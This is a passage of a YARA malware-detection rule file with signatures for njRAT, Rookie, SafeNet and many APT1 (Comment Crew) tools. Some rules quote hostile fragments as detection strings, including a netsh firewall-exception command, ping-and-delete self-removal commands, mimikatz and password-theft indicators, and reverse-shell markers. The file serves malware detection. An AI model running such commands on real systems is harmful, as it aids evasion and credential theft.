$ = "/tmp/screen.jpeg"
condition:
any of them
}
rule SSC_PubSabCode : PubSab Family
{
meta:
description = "PubSab code tricks"
author = "Seth Hardy"
last_modified = "2014-06-19"
strings:
$decrypt = { 6B 45 E4 37 89 CA 29 C2 89 55 E4 }
condition:
any of them
}
rule SSC_RookieStrings : Rookie Family
{
meta:
description = "Rookie Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-25"
strings:
$ = "RookIE/1.0"
condition:
any of them
}
rule SSC_RookieCode : Rookie Family
{
meta:
description = "Rookie code features"
author = "Seth Hardy"
last_modified = "2014-06-25"
strings:
// hidden AutoConfigURL
$ = { C6 ?? ?? ?? 41 C6 ?? ?? ?? 75 [4] C6 ?? ?? ?? 6F C6 ?? ?? ?? 43 C6 ?? ?? ?? 6F C6 ?? ?? ?? 6E C6 ?? ?? ?? 66 }
// hidden ProxyEnable
$ = { C6 ?? ?? ?? 50 [4] C6 ?? ?? ?? 6F C6 ?? ?? ?? 78 C6 ?? ?? ?? 79 C6 ?? ?? ?? 45 C6 ?? ?? ?? 6E C6 ?? ?? ?? 61 }
// xor on rand value?
$ = { 8B 1D 10 A1 40 00 [18] FF D3 8A 16 32 D0 88 16 }
condition:
any of them
}
rule SSC_RooterCode : Rooter Family
{
meta:
description = "Rooter code features"
author = "Seth Hardy"
last_modified = "2014-07-10"
strings:
// xor 0x30 decryption
$ = { 80 B0 ?? ?? ?? ?? 30 40 3D 00 50 00 00 7C F1 }
condition:
any of them
}
rule SSC_SafeNetCode : SafeNet Family
{
meta:
description = "SafeNet code features"
author = "Seth Hardy"
last_modified = "2014-07-16"
strings:
// add edi, 14h; cmp edi, 50D0F8h
$ = { 83 C7 14 81 FF F8 D0 40 00 }
condition:
any of them
}
rule SSC_SafeNetStrings : SafeNet Family
{
meta:
description = "Strings used by SafeNet"
author = "Seth Hardy"
last_modified = "2014-07-16"
strings:
$ = "6dNfg8Upn5fBzGgj8licQHblQvLnUY19z5zcNKNFdsDhUzuI8otEsBODrzFCqCKr"
$ = "/safe/record.php"
$ = "_Rm.bat" wide ascii
$ = "try\x0d\x0a\x09\x09\x09\x09  del %s" wide ascii
$ = "Ext.org" wide ascii
condition:
any of them
}
rule SSC_ScarhiknStrings : Scarhikn Family
{
meta:
description = "Scarhikn Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-25"
strings:
$ = "9887___skej3sd"
$ = "haha123"
condition:
any of them
}
rule SSC_ScarhiknCode : Scarhikn Family
{
meta:
description = "Scarhikn code features"
author = "Seth Hardy"
last_modified = "2014-06-25"
strings:
// decryption
$ = { 8B 06 8A 8B ?? ?? ?? ?? 30 0C 38 03 C7 55 43 E8 ?? ?? ?? ?? 3B D8 59 72 E7 }
$ = { 8B 02 8A 8D ?? ?? ?? ?? 30 0C 30 03 C6 8B FB 83 C9 FF 33 C0 45 F2 AE F7 D1 49 3B E9 72 E2 }
condition:
any of them
}
rule SSC_WimmieShellcode : Wimmie Family
{
meta:
description = "Wimmie code features"
author = "Seth Hardy"
last_modified = "2014-07-17"
strings:
// decryption loop
$ = { 49 30 24 39 83 F9 00 77 F7 8D 3D 4D 10 40 00 B9 0C 03 00 00 }
$xordecrypt = {B9 B4 1D 00 00 [8] 49 30 24 39 83 F9 00 }
condition:
any of them
}
rule SSC_network_traffic_njRAT
{
meta:
author = "info@fidelissecurity.com"
descripion = "njRAT - Remote Access Trojan"
comment = "Rule to alert on network traffic indicators"
filetype = "PCAP - Network Traffic"
date = "2013-07-15"
version = "1.0"
hash1 = "92ee1fb5df21d8cfafa2b02b6a25bd3b"
hash2 ="3576d40ce18bb0349f9dfa42b8911c3a"
hash3 ="24cc5b811a7f9591e7f2cb9a818be104"
hash4 = "3ad5fded9d7fdf1c2f6102f4874b2d52"
hash5 = "a98b4c99f64315aac9dd992593830f35"
hash6 = "5fcb5282da1a2a0f053051c8da1686ef"
hash7 = "a669c0da6309a930af16381b18ba2f9d"
hash8 = "79dce17498e1997264346b162b09bde8"
hash9 = "fc96a7e27b1d3dab715b2732d5c86f80"
ref1 = "http://bit.ly/19tlf4s"
ref2 = "http://www.fidelissecurity.com/threatadvisory"
ref3 = "http://www.threatgeek.com/2013/06/fidelis-threat-advisory-1009-njrat-uncovered.html"
ref4 = "http://threatgeek.typepad.com/files/fta-1009---njrat-uncovered.pdf"
strings:
$string1 = "FM|'|'|"     // File Manager
$string2 = "nd|'|'|"     // File Manager
$string3 = "rn|'|'|"      // Run File
$string4 = "sc~|'|'|"     // Remote Desktop
$string5 = "scPK|'|'|"     // Remote Desktop
$string6 = "CAM|'|'|"     // Remote Cam
$string7 = "USB Video Device[endof]" // Remote Cam
$string8 = "rs|'|'|"     // Reverse Shell
$string9 = "proc|'|'|"     // Process Manager
$string10 = "k|'|'|"     // Process Manager
$string11 = "RG|'|'|~|'|'|"    // Registry Manipulation
$string12 = "kl|'|'|"     // Keylogger file
$string13 = "ret|'|'|"     // Get Browser Passwords
$string14 = "pl|'|'|"     // Get Browser Passwords
$string15 = "lv|'|'|"     // General
$string16 = "prof|'|'|~|'|'|"   // Server rename
$string17 = "un|'|'|~[endof]"   // Uninstall
$idle_string = "P[endof]"    // Idle Connection
condition:
any of ($string*) or #idle_string > 4
}
rule SSC_njrat1: RAT
{
meta:
author = "Brian Wallace @botnet_hunter"
author_email = "bwall@ballastsecurity.net"
date = "2015-05-27"
description = "Identify njRat"
strings:
$a1 = "netsh firewall add allowedprogram " wide
$a2 = "SEE_MASK_NOZONECHECKS" wide
$b1 = "[TAP]" wide
$b2 = " & exit" wide
$c1 = "md.exe /k ping 0 & del " wide
$c2 = "cmd.exe /c ping 127.0.0.1 & del" wide
$c3 = "cmd.exe /c ping" wide
condition:
1 of ($a*) and 1 of ($b*) and 1 of ($c*)
}
rule SSC_BANGAT_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "superhard corp." wide ascii
$s2 = "microsoft corp." wide ascii
$s3 = "[Insert]" wide ascii
$s4 = "[Delete]" wide ascii
$s5 = "[End]" wide ascii
$s6 = "!(*@)(!@KEY" wide ascii
$s7 = "!(*@)(!@SID=" wide ascii
$s8 = "end      binary output" wide ascii
$s9 = "XriteProcessMemory" wide ascii
$s10 = "IE:Password-Protected sites" wide ascii
$s11 = "pstorec.dll" wide ascii
condition:
all of them
}
rule SSC_APT1_TARSIP_ECLIPSE
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$1 = "\\pipe\\ssnp" wide ascii
$2 = "toobu.ini" wide ascii
$3 = "Serverfile is not bigger than Clientfile" wide ascii
$4 = "URL download success" wide ascii
condition:
3 of them
}
rule SSC_AURIGA_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "superhard corp." wide ascii
$s2 = "microsoft corp." wide ascii
$s3 = "[Insert]" wide ascii
$s4 = "[Delete]" wide ascii
$s5 = "[End]" wide ascii
$s6 = "!(*@)(!@KEY" wide ascii
$s7 = "!(*@)(!@SID=" wide ascii
condition:
all of them
}
rule SSC_HACKSFASE1_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = {cb 39 82 49 42 be 1f 3a}
condition:
all of them
}
rule SSC_APT1_WEBC2_HEAD
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$1 = "Ready!" wide ascii
$2 = "connect ok" wide ascii
$3 = "WinHTTP 1.0" wide ascii
$4 = "<head>" wide ascii
condition:
all of them
}
rule SSC_CALENDAR_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "content" wide ascii
$s2 = "title" wide ascii
$s3 = "entry" wide ascii
$s4 = "feed" wide ascii
$s5 = "DownRun success" wide ascii
$s6 = "%s@gmail.com" wide ascii
$s7 = "<!--%s-->" wide ascii
$b8 = "W4qKihsb+So=" wide ascii
$b9 = "PoqKigY7ggH+VcnqnTcmhFCo9w==" wide ascii
$b10 = "8oqKiqb5880/uJLzAsY=" wide ascii
condition:
all of ($s*) or all of ($b*)
}
rule SSC_APT1_WEBC2_Y21K
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$1 = "Y29ubmVjdA" wide ascii // connect
$2 = "c2xlZXA" wide ascii // sleep
$3 = "cXVpdA" wide ascii // quit
$4 = "Y21k" wide ascii // cmd
$5 = "dW5zdXBwb3J0" wide ascii // unsupport
condition:
4 of them
}
rule SSC_APT1_WEBC2_CSON
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$httpa1 = "/Default.aspx?INDEX=" wide ascii
$httpa2 = "/Default.aspx?ID=" wide ascii
$httpb1 = "Win32" wide ascii
$httpb2 = "Accept: text*/*" wide ascii
$exe1 = "xcmd.exe" wide ascii
$exe2 = "Google.exe" wide ascii
condition:
1 of ($exe*) and 1 of ($httpa*) and all of ($httpb*)
}
rule SSC_APT1_WEBC2_TOCK
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$1 = "InprocServer32" wide ascii
$2 = "HKEY_PERFORMANCE_DATA" wide ascii
$3 = "<!---[<if IE 5>]id=" wide ascii
condition:
all of them
}
rule SSC_ccrewDownloader2
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = "3gZFQOBtY3sifNOl" wide ascii
$b = "docbWUWsc2gRMv9HN7TFnvnKcrWUUFdAEem9DkqRALoD" wide ascii
$c = "6QVSOZHQPCMc2A8HXdsfuNZcmUnIqWrOIjrjwOeagILnnScxadKEr1H2MZNwSnaJ" wide ascii
condition:
any of them
}
rule SSC_ccrewSSLBack2
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = {39 82 49 42 BE 1F 3A}
condition:
any of them
}
rule SSC_GLOOXMAIL_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "Kill process success!" wide ascii
$s2 = "Kill process failed!" wide ascii
$s3 = "Sleep success!" wide ascii
$s4 = "based on gloox" wide ascii
$pdb = "glooxtest.pdb" wide ascii
condition:
all of ($s*) or $pdb
}
rule SSC_HACKSFASE2_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "Send to Server failed." wide ascii
$s2 = "HandShake with the server failed. Error:" wide ascii
$s3 = "Decryption Failed. Context Expired." wide ascii
condition:
all of them
}
rule SSC_MANITSME_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "Install an Service hosted by SVCHOST." wide ascii
$s2 = "The Dll file that to be released." wide ascii
$s3 = "SYSTEM\\CurrentControlSet\\Services\\" wide ascii
$s4 = "svchost.exe" wide ascii
$e1 = "Man,it's me" wide ascii
$e2 = "Oh,shit" wide ascii
$e3 = "Hallelujah" wide ascii
$e4 = "nRet == SOCKET_ERROR" wide ascii
$pdb1 = "rouji\\release\\Install.pdb" wide ascii
$pdb2 = "rouji\\SvcMain.pdb" wide ascii
condition:
(all of ($s*)) or (all of ($e*)) or $pdb1 or $pdb2
}
rule SSC_AURIGA_driver_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "Services\\riodrv32" wide ascii
$s2 = "riodrv32.sys" wide ascii
$s3 = "svchost.exe" wide ascii
$s4 = "wuauserv.dll" wide ascii
$s5 = "arp.exe" wide ascii
$pdb = "projects\\auriga" wide ascii
condition:
all of ($s*) or $pdb
}
rule SSC_ccrewMiniasp
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = "MiniAsp.pdb" wide ascii
$b = "device_t=" wide ascii
condition:
any of them
}
rule SSC_BOUNCER_DLL_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "new_connection_to_bounce():" wide ascii
$s2 = "usage:%s IP port [proxip] [port] [key]" wide ascii
condition:
all of them
}
rule SSC_APT1_WEBC2_UGX
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$persis = "SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN" wide ascii
$exe = "DefWatch.exe" wide ascii
$html = "index1.html" wide ascii
$cmd1 = "!@#tiuq#@!" wide ascii
$cmd2 = "!@#dmc#@!" wide ascii
$cmd3 = "!@#troppusnu#@!" wide ascii
condition:
3 of them
}
rule SSC_APT1_WEBC2_TABLE
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$msg1 = "Fail To Execute The Command" wide ascii
$msg2 = "Execute The Command Successfully" wide ascii
/*
$gif1 = /\w+\.gif/
*/
$gif2 = "GIF89" wide ascii
condition:
3 of them
}
rule SSC_ccrewQAZ
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = "!QAZ@WSX" wide ascii
condition:
$a
}
rule SSC_MoonProject
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = "Serverfile is smaller than Clientfile" wide ascii
$b = "\\M tools\\" wide ascii
$c = "MoonDLL" wide ascii
$d = "\\M tools\\" wide ascii
condition:
any of them
}
rule SSC_APT1_Revird_svc
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$dll1 = "nwwwks.dll" wide ascii
$dll2 = "rdisk.dll" wide ascii
$dll3 = "skeys.dll" wide ascii
$dll4 = "SvcHost.DLL.log" wide ascii
$svc1 = "InstallService" wide ascii
$svc2 = "RundllInstallA" wide ascii
$svc3 = "RundllUninstallA" wide ascii
$svc4 = "ServiceMain" wide ascii
$svc5 = "UninstallService" wide ascii
condition:
1 of ($dll*) and 2 of ($svc*)
}
rule SSC_BISCUIT_GREENCAT_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "zxdosml" wide ascii
$s2 = "get user name error!" wide ascii
$s3 = "get computer name error!" wide ascii
$s4 = "----client system info----" wide ascii
$s5 = "stfile" wide ascii
$s6 = "cmd success!" wide ascii
condition:
all of them
}
rule SSC_APT1_WEBC2_GREENCAT
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$1 = "reader_sl.exe" wide ascii
$2 = "MS80547.bat" wide ascii
$3 = "ADR32" wide ascii
$4 = "ControlService failed!" wide ascii
condition:
3 of them
}
rule SSC_APT1_WEBC2_DIV
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$1 = "3DC76854-C328-43D7-9E07-24BF894F8EF5" wide ascii
$2 = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" wide ascii
$3 = "Hello from MFC!" wide ascii
$4 = "Microsoft Internet Explorer" wide ascii
condition:
3 of them
}
rule SSC_LIGHTDART_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "ret.log" wide ascii
$s2 = "Microsoft Internet Explorer 6.0" wide ascii
$s3 = "szURL Fail" wide ascii
$s4 = "szURL Successfully" wide ascii
$s5 = "%s&sdate=%04ld-%02ld-%02ld" wide ascii
condition:
all of them
}
rule SSC_SWORD_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "@***@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>>>" wide ascii
$s2 = "sleep:" wide ascii
$s3 = "down:" wide ascii
$s4 = "*========== Bye Bye ! ==========*" wide ascii
condition:
all of them
}
rule SSC_ccrewDownloader3
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = "ejlcmbv" wide ascii
$b = "bhxjuisv" wide ascii
$c = "yqzgrh" wide ascii
$d = "uqusofrp" wide ascii
$e = "Ljpltmivvdcbb" wide ascii
$f = "frfogjviirr" wide ascii
$g = "ximhttoskop" wide ascii
condition:
4 of them
}
rule SSC_GEN_CCREW1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = "W!r@o#n$g" wide ascii
$b = "KerNel32.dll" wide ascii
condition:
any of them
}
rule SSC_KURTON_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "Mozilla/4.0 (compatible; MSIE8.0; Windows NT 5.1)" wide ascii
$s2 = "!(*@)(!@PORT!(*@)(!@URL" wide ascii
$s3 = "MyTmpFile.Dat" wide ascii
$s4 = "SvcHost.DLL.log" wide ascii
condition:
all of them
}
rule SSC_COMBOS_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "Mozilla4.0 (compatible; MSIE 7.0; Win32)" wide ascii
$s2 = "Mozilla5.1 (compatible; MSIE 8.0; Win32)" wide ascii
$s3 = "Delay" wide ascii
$s4 = "Getfile" wide ascii
$s5 = "Putfile" wide ascii
$s6 = "---[ Virtual Shell]---" wide ascii
$s7 = "Not Comming From Our Server %s." wide ascii
condition:
all of them
}
rule SSC_APT1_aspnetreport
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$url = "aspnet_client/report.asp" wide ascii
$param = "name=%s&Gender=%c&Random=%04d&SessionKey=%s" wide ascii
$pay1 = "rusinfo.exe" wide ascii
$pay2 = "cmd.exe" wide ascii
$pay3 = "AdobeUpdater.exe" wide ascii
$pay4 = "buildout.exe" wide ascii
$pay5 = "DefWatch.exe" wide ascii
$pay6 = "d.exe" wide ascii
$pay7 = "em.exe" wide ascii
$pay8 = "IMSCMig.exe" wide ascii
$pay9 = "localfile.exe" wide ascii
$pay10 = "md.exe" wide ascii
$pay11 = "mdm.exe" wide ascii
$pay12 = "mimikatz.exe" wide ascii
$pay13 = "msdev.exe" wide ascii
$pay14 = "ntoskrnl.exe" wide ascii
$pay15 = "p.exe" wide ascii
$pay16 = "otepad.exe" wide ascii
$pay17 = "reg.exe" wide ascii
$pay18 = "regsvr.exe" wide ascii
$pay19 = "runinfo.exe" wide ascii
$pay20 = "AdobeUpdate.exe" wide ascii
$pay21 = "inetinfo.exe" wide ascii
$pay22 = "svehost.exe" wide ascii
$pay23 = "update.exe" wide ascii
$pay24 = "NTLMHash.exe" wide ascii
$pay25 = "wpnpinst.exe" wide ascii
$pay26 = "WSDbg.exe" wide ascii
$pay27 = "xcmd.exe" wide ascii
$pay28 = "adobeup.exe" wide ascii
$pay29 = "0830.bin" wide ascii
$pay30 = "1001.bin" wide ascii
$pay31 = "a.bin" wide ascii
$pay32 = "ISUN32.EXE" wide ascii
$pay33 = "AcroRD32.EXE" wide ascii
$pay34 = "INETINFO.EXE" wide ascii
condition:
$url and $param and 1 of ($pay*)
}
rule SSC_LONGRUN_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "Mozilla/4.0 (compatible; Windows NT 5.1; MSIE 7.0; Trident/4.0)" wide ascii
$s2 = "%s\\%c%c%c%c%c%c%c" wide ascii
$s3 = "wait:" wide ascii
$s4 = "Dcryption Error! Invalid Character" wide ascii
condition:
all of them
}
rule SSC_TrojanCookies_CCREW
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = "sleep:" wide ascii
$b = "content=" wide ascii
$c = "reqpath=" wide ascii
$d = "savepath=" wide ascii
$e = "command=" wide ascii
condition:
4 of ($a,$b,$c,$d,$e)
}
rule SSC_TABMSGSQL_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "letusgohtppmmv2.0.0.1" wide ascii
$s2 = "Mozilla/4.0 (compatible; )" wide ascii
$s3 = "filestoc" wide ascii
$s4 = "filectos" wide ascii
$s5 = "reshell" wide ascii
condition:
all of them
}
rule SSC_APT1_WEBC2_RAVE
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$1 = "iniet.exe" wide ascii
$2 = "cmd.exe" wide ascii
$3 = "SYSTEM\\CurrentControlSet\\Services\\DEVFS" wide ascii
$4 = "Device File System" wide ascii
condition:
3 of them
}
rule SSC_MACROMAIL_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "svcMsn.dll" wide ascii
$s2 = "RundllInstall" wide ascii
$s3 = "Config service %s ok." wide ascii
$s4 = "svchost.exe" wide ascii
condition:
all of them
}
rule SSC_APT1_WARP
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$err1 = "exception..." wide ascii
$err2 = "failed..." wide ascii
$err3 = "opened..." wide ascii
$exe1 = "cmd.exe" wide ascii
$exe2 = "ISUN32.EXE" wide ascii
condition:
2 of ($err*) and all of ($exe*)
}
rule SSC_thequickbrow_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "thequickbrownfxjmpsvalzydg" wide ascii
condition:
all of them
}
rule SSC_BOUNCER_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "*Qd9kdgba33*%Wkda0Qd3kvn$*&><(*&%$E#%$#1234asdgKNAg@!gy565dtfbasdg" wide ascii
$s2 = "IDR_DATA%d" wide ascii
$s3 = "asdfqwe123cxz" wide ascii
$s4 = "Mode must be 0(encrypt) or 1(decrypt)." wide ascii
condition:
($s1 and $s2) or ($s3 and $s4)
}
rule SSC_metaxcd
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = "<meta xcd=" wide ascii
condition:
$a
}
rule SSC_APT1_WEBC2_AUSOV
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$1 = "ntshrui.dll" wide ascii
$2 = "%SystemRoot%\\System32\\" wide ascii
$3 = "<!--DOCHTML" wide ascii
$4 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" wide ascii
$5 = "Ausov" wide ascii
condition:
4 of them
}
rule SSC_CCREWBACK1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = "postvalue" wide ascii
$b = "postdata" wide ascii
$c = "postfile" wide ascii
$d = "hostname" wide ascii
$e = "clientkey" wide ascii
$f = "start Cmd Failure!" wide ascii
$g = "sleep:" wide ascii
$h = "downloadcopy:" wide ascii
$i = "download:" wide ascii
$j = "geturl:" wide ascii
$k = "1.234.1.68" wide ascii
condition:
4 of ($a,$b,$c,$d,$e) or $f or 3 of ($g,$h,$i,$j) or $k
}
rule SSC_DAIRY_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "Mozilla/4.0 (compatible; MSIE 7.0;)" wide ascii
$s2 = "KilFail" wide ascii
$s3 = "KilSucc" wide ascii
$s4 = "pkkill" wide ascii
$s5 = "pklist" wide ascii
condition:
all of them
}
rule SSC_APT1_TARSIP_MOON
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "\\XiaoME\\SunCloud-Code\\moon" wide ascii
$s2 = "URL download success!" wide ascii
$s3 = "Kugoosoft" wide ascii
$msg1 = "Modify file failed!! So strange!" wide ascii
$msg2 = "Create cmd process failed!" wide ascii
$msg3 = "The command has not been implemented!" wide ascii
$msg4 = "Runas success!" wide ascii
$onec1 = "onec.php" wide ascii
$onec2 = "/bin/onec" wide ascii
condition:
1 of ($s*) and 1 of ($msg*) and 1 of ($onec*)
}
rule SSC_APT1_RARSilent_EXE_PDF
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$winrar1 = "WINRAR.SFX" wide ascii
$str2 = "Steup=" wide ascii
condition:
all of them
}
rule SSC_MINIASP_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "miniasp" wide ascii
$s2 = "wakeup=" wide ascii
$s3 = "download ok!" wide ascii
$s4 = "command is null!" wide ascii
$s5 = "device_input.asp?device_t=" wide ascii
condition:
all of them
}
rule SSC_APT1_WEBC2_YAHOO
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$http1 = "HTTP/1.0" wide ascii
$http2 = "Content-Type:" wide ascii
$uagent = "IPHONE8.5(host:%s,ip:%s)" wide ascii
condition:
all of them
}
rule SSC_MiniASP
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$KEY = { 71 30 6E 63 39 77 38 65 64 61 6F 69 75 6B 32 6D 7A 72 66 79 33 78 74 31 70 35 6C 73 36 37 67 34 62 76 68 6A }
$PDB = "MiniAsp.pdb" nocase wide ascii
condition:
any of them
}
rule SSC_APT1_WEBC2_QBP
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$1 = "2010QBP" wide ascii
$2 = "adobe_sl.exe" wide ascii
$3 = "URLDownloadToCacheFile" wide ascii
$4 = "dnsapi.dll" wide ascii
$5 = "urlmon.dll" wide ascii
condition:
4 of them
}
rule SSC_EclipseSunCloudRAT
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = "Eclipse_A" wide ascii
$b = "\\PJTS\\" wide ascii
$c = "Eclipse_Client_B.pdb" wide ascii
$d = "XiaoME" wide ascii
$e = "SunCloud-Code" wide ascii
$f = "/uc_server/data/forum.asp" wide ascii
condition:
any of them
}
rule SSC_APT1_MAPIGET
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "%s\\Attachment.dat" wide ascii
$s2 = "MyOutlook" wide ascii
$s3 = "mail.txt" wide ascii
$s4 = "Recv Time:" wide ascii
$s5 = "Subject:" wide ascii
condition:
all of them
}
rule SSC_ccrewSSLBack3
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = "SLYHKAAY" wide ascii
condition:
any of them
}
rule SSC_APT1_dbg_mess
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$dbg1 = "Down file ok!" wide ascii
$dbg2 = "Send file ok!" wide ascii
$dbg3 = "Command Error!" wide ascii
$dbg4 = "Pls choose target first!" wide ascii
$dbg5 = "Alert!" wide ascii
$dbg6 = "Pls press enter to make sure!" wide ascii
$dbg7 = "Are you sure to " wide ascii
$pay1 = "rusinfo.exe" wide ascii
$pay2 = "cmd.exe" wide ascii
$pay3 = "AdobeUpdater.exe" wide ascii
$pay4 = "buildout.exe" wide ascii
$pay5 = "DefWatch.exe" wide ascii
$pay6 = "d.exe" wide ascii
$pay7 = "em.exe" wide ascii
$pay8 = "IMSCMig.exe" wide ascii
$pay9 = "localfile.exe" wide ascii
$pay10 = "md.exe" wide ascii
$pay11 = "mdm.exe" wide ascii
$pay12 = "mimikatz.exe" wide ascii
$pay13 = "msdev.exe" wide ascii
$pay14 = "ntoskrnl.exe" wide ascii
$pay15 = "p.exe" wide ascii
$pay16 = "otepad.exe" wide ascii
$pay17 = "reg.exe" wide ascii
$pay18 = "regsvr.exe" wide ascii
$pay19 = "runinfo.exe" wide ascii
$pay20 = "AdobeUpdate.exe" wide ascii
$pay21 = "inetinfo.exe" wide ascii
$pay22 = "svehost.exe" wide ascii
$pay23 = "update.exe" wide ascii
$pay24 = "NTLMHash.exe" wide ascii
$pay25 = "wpnpinst.exe" wide ascii
$pay26 = "WSDbg.exe" wide ascii
$pay27 = "xcmd.exe" wide ascii
$pay28 = "adobeup.exe" wide ascii
$pay29 = "0830.bin" wide ascii
$pay30 = "1001.bin" wide ascii
$pay31 = "a.bin" wide ascii
$pay32 = "ISUN32.EXE" wide ascii
$pay33 = "AcroRD32.EXE" wide ascii
$pay34 = "INETINFO.EXE" wide ascii
condition:
4 of ($dbg*) and 1 of ($pay*)
}
rule SSC_NEWSREELS_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "Mozilla/4.0 (compatible; Windows NT 5.1; MSIE 7.0)" wide ascii
$s2 = "name=%s&userid=%04d&other=%c%s" wide ascii
$s3 = "download ok!" wide ascii
$s4 = "command is null!" wide ascii
$s5 = "noclient" wide ascii
$s6 = "wait" wide ascii
$s7 = "active" wide ascii
$s8 = "hello" wide ascii
condition:
all of them
}
rule SSC_ccrewDownloader1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = {DD B5 61 F0 20 47 20 57 D6 65 9C CB 31 1B 65 42}
condition:
any of them
}
rule SSC_APT1_WEBC2_ADSPACE
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$1 = "<!---HEADER ADSPACE style=" wide ascii
$2 = "ERSVC.DLL" wide ascii
condition:
all of them
}
rule SSC_APT1_GDOCUPLOAD
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$str1 = "name=\"GALX\"" wide ascii
$str2 = "User-Agent: Shockwave Flash" wide ascii
$str3 = "add cookie failed..." wide ascii
$str4 = ",speed=%f" wide ascii
condition:
3 of them
}
rule SSC_APT1_WEBC2_BOLID
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$vm = "VMProtect" wide ascii
$http = "http://[c2_location]/[page].html" wide ascii
condition:
all of them
}
rule SSC_STARSYPOUND_APT1
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$s1 = "*(SY)# cmd" wide ascii
$s2 = "send = %d" wide ascii
$s3 = "cmd.exe" wide ascii
$s4 = "*(SY)#" wide ascii
condition:
all of them
}
rule SSC_DownloaderPossibleCCrew
{
meta:
author = "AlienVault Labs"
info = "CommentCrew-threat-apt1"
strings:
$a = "%s?%.6u" wide ascii
